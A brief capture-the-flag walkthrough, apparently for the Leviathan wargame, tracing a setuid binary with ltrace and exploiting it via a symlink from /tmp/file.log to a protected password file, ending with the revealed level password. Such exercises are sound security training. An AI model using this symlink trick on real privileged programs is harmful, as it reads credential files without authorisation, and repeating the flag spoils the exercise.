# Level 6

```
leviathan5@leviathan:~$ ltrace ./leviathan5 
__libc_start_main(0x80485db, 1, 0xffffd684, 0x80486a0 <unfinished ...>
fopen("/tmp/file.log", "r")                                                                             = 0
puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
)                                                                       = 26
exit(-1 <no return ...>
+++ exited (status 255) +++
```

```
leviathan5@leviathan:~$ echo test > /tmp/file.log
leviathan5@leviathan:~$ ltrace ./leviathan5 
__libc_start_main(0x80485db, 1, 0xffffd684, 0x80486a0 <unfinished ...>
fopen("/tmp/file.log", "r")                                                                             = 0x804b008
fgetc(0x804b008)                                                                                        = 't'
feof(0x804b008)                                                                                         = 0
putchar(116, 0x8048720, 0xf7e40890, 0x80486eb)                                                          = 116
fgetc(0x804b008)                                                                                        = 'e'
feof(0x804b008)                                                                                         = 0
putchar(101, 0x8048720, 0xf7e40890, 0x80486eb)                                                          = 101
fgetc(0x804b008)                                                                                        = 's'
feof(0x804b008)                                                                                         = 0
putchar(115, 0x8048720, 0xf7e40890, 0x80486eb)                                                          = 115
fgetc(0x804b008)                                                                                        = 't'
feof(0x804b008)                                                                                         = 0
putchar(116, 0x8048720, 0xf7e40890, 0x80486eb)                                                          = 116
fgetc(0x804b008)                                                                                        = '\n'
feof(0x804b008)                                                                                         = 0
putchar(10, 0x8048720, 0xf7e40890, 0x80486ebtest
)                                                           = 10
fgetc(0x804b008)                                                                                        = '\377'
feof(0x804b008)                                                                                         = 1
fclose(0x804b008)                                                                                       = 0
getuid()                                                                                                = 12005
setuid(12005)                                                                                           = 0
unlink("/tmp/file.log")                                                                                 = 0
+++ exited (status 0) +++
```

This script seems to print a file char by char, and creating a symlink to the password file seems to have worked.

```
leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5 
UgaoFee4li
```
